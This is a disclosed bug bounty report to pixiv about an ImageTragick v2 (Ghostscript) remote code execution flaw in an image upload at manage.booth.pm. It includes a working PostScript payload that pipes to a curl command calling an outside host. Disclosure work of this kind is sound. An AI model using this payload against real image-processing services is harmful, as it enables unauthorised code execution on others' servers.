# RCE due to ImageTragick v2

## Report Details
- **Report ID**: 402362
- **URL**: https://hackerone.com/reports/402362
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-08-29T10:23:03.778Z
- **Disclosed**: 2021-03-16T15:35:11.606Z

## Reporter
- **Username**: chaosbolt
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: pixiv

## Vulnerability Information
Hello Pixiv team! Your Image processing process suffering from ImageTragick v2. Issue is caused by ghostscript RCE findnings.

How to reproduce:
PATCH /design
Host: manage.booth.pm

send following image:
```
------WebKitFormBoundaryXX05yrKS4g8d9CWh
Content-Disposition: form-data; name="shop[header]"; filename="imagetragick.jpeg"
Content-Type: image/jpeg

%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%curl https://avtohanter.ru/qwetest) currentdevice putdeviceprops
------WebKitFormBoundaryXX05yrKS4g8d9CWh--
```

How to fix:
Update ImageMagick, should help

## Impact

Remote Code Execution

## Attachments
No attachments
